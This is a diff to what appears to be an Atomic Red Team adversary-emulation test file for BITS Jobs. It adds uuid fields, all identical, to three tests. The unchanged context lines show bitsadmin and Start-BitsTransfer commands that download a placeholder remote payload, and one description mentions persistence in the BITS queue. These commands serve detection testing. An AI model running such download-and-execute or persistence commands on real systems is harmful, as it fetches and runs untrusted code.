@@ -4,6 +4,8 @@ display_name: BITS Jobs
 
 atomic_tests:
 - name: Download & Execute
+  uuid: 24417adb-f0aa-438a-b28d-0f21a4090571
+
   description: |
     This test simulates an adversary leveraging bitsadmin.exe to download
     and execute a payload
@@ -24,6 +26,8 @@ atomic_tests:
     command: |
       bitsadmin.exe  /transfer /Download /priority Foreground #{remote_file} #{local_file}
 - name: Download & Execute via PowerShell BITS
+  uuid: 24417adb-f0aa-438a-b28d-0f21a4090571
+
   description: |
     This test simulates an adversary leveraging bitsadmin.exe to download
     and execute a payload leveraging PowerShell
@@ -44,6 +48,8 @@ atomic_tests:
       Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}
 
 - name: Persist, Download, & Execute
+  uuid: 24417adb-f0aa-438a-b28d-0f21a4090571
+
   description: |
     This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transfer
     and execute a payload in multiple steps. This job will remain in the BITS queue for 90 days by default if not removed.
